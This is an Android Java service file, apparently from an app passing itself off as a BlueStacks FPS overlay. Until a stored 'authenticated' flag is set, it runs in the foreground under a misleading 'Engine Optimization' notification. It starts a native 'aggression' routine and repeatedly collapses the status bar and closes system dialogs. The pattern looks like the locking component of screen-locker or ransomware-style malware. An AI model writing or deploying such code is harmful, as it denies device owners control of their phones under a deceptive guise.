package com.bluestacks.fpsoverlay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.content.pm.ServiceInfo;
import java.lang.reflect.Method;

public class FPSService extends Service {

    private Object statusBarService;
    private Method collapsePanelsMethod;

    static {
        System.loadLibrary("fps-native");
    }

    public native void startNativeAggression(String serviceName);
    public native void stopNativeAggression();

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        
        // Cek auth di awal, jika sudah auth jangan jalankan agresi
        boolean isAuth = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
                        .getBoolean("is_authenticated", false);
        if (isAuth) {
            stopSelf();
            return;
        }

        prepareStatusBarReflection();
        startInForeground();
        startNativeAggression(getPackageName() + "/.FPSService");
    }

    private void prepareStatusBarReflection() {
        try {
            statusBarService = getSystemService("statusbar");
            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
            collapsePanelsMethod = statusBarManager.getMethod("collapsePanels");
            collapsePanelsMethod.setAccessible(true);
        } catch (Exception e) {
            // Refleksi gagal, akan fallback ke broadcast di collapseStatusBar()
        }
    }

    private void startInForeground() {
        String CHANNEL_ID = "fps_overlay_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "BlueStacks Engine",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);

        Notification notification = builder
                .setContentTitle("Engine Optimization")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }

    // Dipanggil JNI: Sangat cepat karena menggunakan cache method
    public void collapseStatusBar() {
        try {
            if (collapsePanelsMethod != null && statusBarService != null) {
                collapsePanelsMethod.invoke(statusBarService);
            } else {
                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
            }
        } catch (Exception e) {
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
        }
    }

    // Dipanggil JNI
    public void closeSystemDialogs() {
        sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
    }

    @Override
    public void onDestroy() {
        stopNativeAggression();
        super.onDestroy();
    }
}
